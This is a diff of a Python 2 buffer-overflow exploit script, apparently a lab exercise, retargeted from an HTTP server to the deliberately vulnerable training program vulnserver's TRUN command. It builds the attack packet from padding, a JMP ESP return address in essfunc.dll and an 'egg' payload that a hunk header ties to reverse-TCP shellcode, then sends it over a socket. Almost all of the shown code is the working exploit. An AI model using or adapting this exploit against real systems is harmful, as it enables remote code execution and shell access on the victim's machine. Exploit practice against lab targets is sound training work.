@@ -1,6 +1,8 @@
 """
 Tested OK against Windows XP [Version 5.1.2600] box
 
+BTW, get vulnserver from http://grey-corner.blogspot.fr/p/vulnserver.html
+
 (c) h4lf-jiffie (dohmatob elvis dopgima)
 """
 
@@ -44,7 +46,7 @@ reverse_tcp_EGG = (
 
 if __name__ == '__main__':
     # sanitize command-line
-    print "\t" + "+"*13 + " %s by h4lf-jiffie (dohmatob elvis dopgima) "%os.path.basename(sys.argv[0]) + "+"*13
+    print "\r\n\t--[ %s by h4lf-jiffie (dohmatob elvis dopgima) ]--\r\n "%os.path.basename(sys.argv[0]) 
     if len(sys.argv) < 3:
         print 'Usage: python %s [OPTIONS] <target_IP> <target_PORT>'%(sys.argv[0])
         sys.exit(1)
@@ -57,20 +59,21 @@ if __name__ == '__main__':
     # setup socket
     soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     soc.connect((sys.argv[1], int(sys.argv[2])))
-
+    
     # build request
-    req_pkt = 'GET '
-    req_pkt += 'A'*(1791 - len(req_pkt)) # alphanum padding
-    req_pkt += 'llGw' # offset = 1791: alphanum address of 'JMP ESP' in COMCTL32.DLL
-    req_pkt += 'A'*(1795 - len(req_pkt)) # padding
-    req_pkt += egg # offset = 1795: ESP points here
-    req_pkt += ' HTTP/1.1\r\n\r\n'
+    req_pkt = 'TRUN /.:/ ' # SPIKE fuzzer says we can screw'em this way!
+    req_pkt += 'U'*(2002 + 0xa - len(req_pkt)) # padding (NB: the length of the string 'TRUN /.:/ ' is 10)
+    req_pkt += struct.pack('<I', 0x625011F7) # offset = 2002 + 0xa: address of 'JMP ESP' in essfunc.dll
+    req_pkt += 'V'*(2006 + 0xa - len(req_pkt)) # padding
+    req_pkt += egg # offset = 2006 + 0xa: ESP points here
+    req_pkt += '\r\n'
 
     # fire
+    print soc.recv(1024);
     print 'REQUEST PKT (%d bytes):'%len(req_pkt)
     print req_pkt
     soc.send(req_pkt)
-
+     
     # sanity
     soc.close()
 
